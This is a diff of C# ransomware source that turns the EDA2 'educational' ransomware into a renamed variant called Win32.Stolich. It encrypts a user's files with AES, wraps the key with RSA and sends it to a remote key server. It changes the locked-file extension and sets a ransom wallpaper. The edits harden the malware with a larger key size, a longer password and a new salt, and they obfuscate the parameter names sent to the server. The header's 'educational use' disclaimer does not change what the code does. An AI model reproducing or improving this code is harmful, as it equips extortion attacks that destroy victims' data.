@@ -1,16 +1,21 @@
 ﻿/*
-          _       ___  
-         | |     |__ \ 
-  ___  __| | __ _   ) |
- / _ \/ _` |/ _` | / / 
-|  __/ (_| | (_| |/ /_ 
- \___|\__,_|\__,_|____|
- 
-* Coded by Utku Sen(Jani) / October 2015 Istanbul / utkusen.com / Twitter: @utku1337
-* eda2 may be used only for Educational Purposes. Do not use it as a ransomware!
-* You could go to jail on obstruction of justice charges just for running eda2, even though you are innocent.                       
-                       
- */
+
+>>>>>>>>>>>>>>>>>>>>>>
+>>>>>>>>>>>>>
+>>>> V2in16^2.St01ich|)
+>>>> Copyright (c) 2016 - Empinel / May 2016 Mumbai City / For Educational Use ONLY
+>>>>>>>>>>>>>
+>>>>>>>>>>>>>>>>>>>>>>>
+
+* Based on the EDUCATIONAL EDA2 Ransomware
+* EDA2 Coded by Utku Sen(Jani) / October 2015 Istanbul / utkusen.com / Twitter: @utku1337
+* You could go to jail on obstruction of justice charges just for running Stolich, or even worse.       
+* 
+* By running this program, scratch that - even reading the code, you do not hold Empinel and Utku Sen
+* Liable from any damages or losses or lawsuits or anything that invokes criminal/civil proceeding in
+* the court of law. If you agree to this, please do go ahead - or else kindly close and delete the
+* copy of Win32.Stolich.
+*/
 
 using System;
 using System.Collections.Generic;
@@ -29,14 +34,14 @@ using System.Runtime.InteropServices;
 
 
 
-namespace eda2
+namespace stolich
 {
     public partial class Form1 : Form
     {
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
         private static bool OAEP = false; //Optimal Asymmetric Encryption Padding
-        const int keySize = 2048; //key size for RSA algorithm
+        const int keySize = 4096; //key size for RSA algorithm
         string publicKey;
         string encryptedPassword; //AES key encrypted with RSA public key
         string userName = Environment.UserName;
@@ -46,9 +51,7 @@ namespace eda2
         string keySaveUrl = "http://www.example.com/panel/savekey.php"; //saves encrypted key to database
         string backgroundImageUrl = "https://i.imgur.com/5iVZ4gf.jpg"; //desktop background picture
         string aesPassword;
-
-
-
+		
         public Form1()
         {
             InitializeComponent();
@@ -69,8 +72,8 @@ namespace eda2
             Opacity = 100;
         }
 
-        //Makes a POST request to web server with "username" and "pcname" parameters
-        //Webserver responses with the RSA public key and the function returns it.
+		// Makes a POST request to web server with "x39nam" (USERNAME) and "cpe93j" (COMPUTERNAME) parameters
+        // Webserver responses with the RSA public key and the function returns it.
         public string getPublicKey(string url)
         {
 
@@ -102,7 +105,7 @@ namespace eda2
             string path = "\\Desktop\\test";
             string startPath = userDir + userName + path;
             publicKey = getPublicKey(generatorUrl);
-            string aesPassword = CreatePassword(32);
+            string aesPassword = CreatePassword(64);
             encryptDirectory(startPath,aesPassword);
             encryptedPassword = EncryptTextRSA(aesPassword, keySize, publicKey);
             sendKey(keySaveUrl);
@@ -127,7 +130,7 @@ namespace eda2
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
             File.WriteAllBytes(file, bytesEncrypted);
-            System.IO.File.Move(file, file + ".locked"); //new file extension
+            System.IO.File.Move(file, file + ".locknr"); //new file extension
         }
 
         //Encrypts directory and subdirectories
@@ -181,7 +184,7 @@ namespace eda2
         public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
         {
             byte[] encryptedBytes = null;
-            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+            byte[] saltBytes = new byte[] { 0x00, 0x84, 0xAB, 0xCC, 0x88, 0xD8, 0xE8, 0xFF };
             using (MemoryStream ms = new MemoryStream())
             {
                 using (RijndaelManaged AES = new RijndaelManaged())
@@ -221,19 +224,25 @@ namespace eda2
         }
 
         //Generates a random string
-        public static string CreatePassword(int length)
-        {
-            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="; //pattern
-            StringBuilder res = new StringBuilder();
-            using (RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider())
-            {
-                while (length-- > 0)
-                {
-                    res.Append(valid[GetInt(rnd, valid.Length)]);
-                }
-            }
-            return res.ToString();
-        }
+		public static string CreatePassword(int maxSize)
+		{
+			char[] chars = new char[62];
+			chars =
+				"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
+			byte[] data = new byte[1];
+			using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
+			{
+				crypto.GetNonZeroBytes(data);
+				data = new byte[maxSize];
+				crypto.GetNonZeroBytes(data);
+			}
+			StringBuilder result = new StringBuilder(maxSize);
+			foreach (byte b in data)
+			{
+				result.Append(chars[b % (chars.Length)]);
+			}
+			return result.ToString();
+		}
 
         //Changes desktop background image
         public void SetWallpaper(String path)
